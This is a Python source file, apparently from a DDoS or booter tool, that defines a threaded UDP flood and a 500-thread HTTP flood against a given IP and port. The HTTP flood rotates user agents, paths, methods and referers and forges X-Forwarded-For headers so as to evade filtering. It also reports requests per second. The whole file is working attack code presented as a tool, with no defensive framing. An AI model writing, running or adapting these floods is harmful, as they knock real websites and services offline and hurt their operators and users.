# attack_methods.py
import time
import socket
import random
import threading
import ssl

def attack_udp_god(ip, port, duration):
    """Best UDP flood attack method"""
    import random
    import socket
    import threading
    import time
    
    times = 50000
    threads_count = 5
    choice = 'y'  # Always use UDP
    
    def run():
        data = random._urandom(1024)
        i = random.choice(("[*]","[!]","[#]"))
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip), int(port))
                for x in range(times):
                    if time.time() >= end_time:
                        break
                    s.sendto(data, addr)
            except Exception as e:
                pass  # Fixed: added indented block
    
    def run2():
        data = random._urandom(16)
        i = random.choice(("[*]","[!]","[#]"))
        end_time = time.time() + duration
        
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(data)
                for x in range(times):
                    if time.time() >= end_time:
                        break
                    s.send(data)
            except Exception as e:
                s.close()  # Fixed: added indented block
    
    threads = []
    for y in range(threads_count):
        if choice == 'y':
            th = threading.Thread(target=run)
            th.daemon = True
            threads.append(th)
        else:
            th = threading.Thread(target=run2)
            th.daemon = True
            threads.append(th)
    
    for th in threads:
        th.start()
    
    end_time = time.time() + duration
    while time.time() < end_time and any(th.is_alive() for th in threads):
        time.sleep(0.1)

def attack_http_flood(ip, port, duration):
    """Advanced HTTP flood attack with multiple techniques"""
    import socket
    import ssl
    import random
    import threading
    import time
    import struct
    
    threads_count = 500
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
    ]
    
    paths = [
        "/", "/wp-admin/", "/admin/", "/login/", "/api/", 
        "/search/", "/checkout/", "/cart/", "/product/", 
        "/user/profile/", "/ajax/", "/graphql", "/wp-json/"
    ]
    
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
    
    referers = [
        "https://www.google.com/", "https://www.bing.com/", 
        "https://yandex.com/", "https://duckduckgo.com/",
        "https://www.facebook.com/", "https://twitter.com/",
        "https://www.reddit.com/", "https://www.linkedin.com/"
    ]
    
    accepts = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ]
    
    languages = ["en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.7", "de-DE,de;q=0.6"]
    encodings = ["gzip, deflate, br", "gzip, deflate", "identity"]
    cache_controls = ["no-cache", "max-age=0", "no-store"]
    
    use_ssl = port == 443
    request_count = [0]
    
    def build_http_request(host):
        method = random.choice(methods)
        path = random.choice(paths)
        if random.random() < 0.3:
            path += "?" + "&".join([f"{random.choice(['id','q','search','page','category'])}={random.randint(1,1000)}" 
                                    for _ in range(random.randint(1,3))])
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {host}",
            f"User-Agent: {random.choice(user_agents)}",
            f"Accept: {random.choice(accepts)}",
            f"Accept-Language: {random.choice(languages)}",
            f"Accept-Encoding: {random.choice(encodings)}",
            f"Cache-Control: {random.choice(cache_controls)}",
            f"Connection: keep-alive",
            f"Upgrade-Insecure-Requests: 1",
        ]
        if random.random() < 0.7:
            headers.append(f"Referer: {random.choice(referers)}")
        if random.random() < 0.6:
            headers.append(f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
        if method == "POST":
            headers.append("Content-Type: application/x-www-form-urlencoded")
            content = f"data={random.randint(1000000,9999999)}"
            headers.append(f"Content-Length: {len(content)}")
            headers.append("")  # blank line before body
            headers.append(content)
        else:
            headers.append("")
        return "\r\n".join(headers)
    
    def attack_thread():
        end_time = time.time() + duration
        try:
            host = ip
            if not all(c.isdigit() or c == '.' for c in ip):
                host = socket.gethostbyname(ip)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=ip)
            
            sock.connect((host, port))
            
            while time.time() < end_time:
                try:
                    request = build_http_request(ip)
                    sock.sendall(request.encode())
                    request_count[0] += 1
                    time.sleep(0.01)
                except (socket.error, ssl.SSLError):
                    try:
                        sock.close()
                    except:
                        pass
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    if use_ssl:
                        sock = context.wrap_socket(sock, server_hostname=ip)
                    sock.connect((host, port))
            
            try:
                sock.close()
            except:
                pass
        except Exception as e:
            pass  # Fixed: added indented block
    
    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=attack_thread)
        thread.daemon = True
        threads.append(thread)
    
    for thread in threads:
        thread.start()
    
    start_time = time.time()
    last_display = start_time
    
    while time.time() < start_time + duration:
        time.sleep(1)
        current_time = time.time()
        if current_time - last_display >= 5:
            elapsed = current_time - start_time
            remaining = duration - elapsed
            rps = request_count[0] / elapsed if elapsed > 0 else 0
            print(f"HTTP Flood: {request_count[0]:,} requests sent ({rps:,.0f} req/sec), {remaining:.1f}s remaining")
            last_display = current_time
    
    for thread in threads:
        try:
            thread.join(1)
        except:
            pass
